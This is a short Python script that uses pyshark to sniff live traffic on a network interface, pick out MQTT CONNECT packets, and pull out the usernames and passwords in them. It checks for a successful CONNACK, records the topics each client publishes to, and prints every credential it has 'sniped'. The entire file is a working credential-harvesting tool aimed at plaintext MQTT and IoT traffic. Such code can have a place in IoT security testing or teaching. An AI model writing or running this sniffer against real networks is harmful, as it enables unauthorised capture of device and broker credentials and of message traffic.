import pyshark
#cap = pyshark.FileCapture('./capture.cap')
capture = pyshark.LiveCapture( '\\Device\\NPF_{E69382B6-A1E1-4B26-B475-B23406628C09}')
capture.sniff(timeout=20)
cred =[]
needed_pks=[]
temp_topic=0
temp_pwd=0
temp_uname=0

for a in capture._packets:
    if a.highest_layer=='MQTT':
        try:
            if a.layers[3].conflags=='0xc2':
                tempp_uname = a.mqtt.username
                tempp_pwd = a.mqtt.passwd
                got_uname = 1
                continue
        except:
            pass
        
        try:
            if a.mqtt.conack_flags == '0x00':
             #cred.append[temp_uname, temp_pwd]
                temp_uname=tempp_uname
                temp_pwd=tempp_pwd
                print("one credential sniped, user = "+temp_uname+" and pwd = "+temp_pwd)
                continue
        except:
            pass

        try:
            if a.layers[3].hdrflags == '0x30':
                temp_topic = a.layers[3].topic
                print("one message published by client to "+temp_topic)
                continue
        except:
            pass

        try:
            if a.mqtt.hdrflags == '0xe0':
                print("client is done successfully")
                cred.append([temp_uname, temp_pwd, temp_topic])
                temp_topic=0
                temp_pwd=0
                temp_uname=0
                continue
        except:
            pass




#capture
print("list of capture credentials are - uname, pwd, topic")
print(cred)
